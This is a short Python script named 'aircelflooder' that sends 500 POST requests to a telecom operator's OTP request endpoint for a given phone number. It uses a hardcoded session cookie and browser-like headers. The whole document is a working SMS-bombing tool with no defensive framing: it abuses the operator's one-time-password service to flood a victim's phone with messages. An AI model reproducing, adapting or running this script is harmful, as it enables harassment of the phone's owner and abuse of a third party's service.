def aircelflooder():
    import requests

    url = "http://newsim.aircel.com/GYSHD/raiseOtpRequest"

    querystring = {"contact": mobile}

    headers = {
        'accept': "text/plain, */*; q=0.01",
        'accept-encoding': "gzip, deflate",
        'accept-language': "en-GB,en-US;q=0.8,en;q=0.6",
        'cache-control': "no-cache",
        'connection': "keep-alive",
        'content-length': "0",
        'cookie': "JSESSIONID=izMd9OHRnznJlbhLQNTdX2EL",
        'host': "newsim.aircel.com",
        'origin': "http://newsim.aircel.com",
        'pragma': "no-cache",
        'referer': "http://newsim.aircel.com/GYSHD/fb",
        'user-agent': "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.116 Safari/537.36",
        'x-requested-with': "XMLHttpRequest"
    }

    response = requests.request("POST", url, headers=headers, params=querystring)

    print(response.text)

mobile = "9999999999"
smsCount = 500
for value in range(0,smsCount):
    aircelflooder()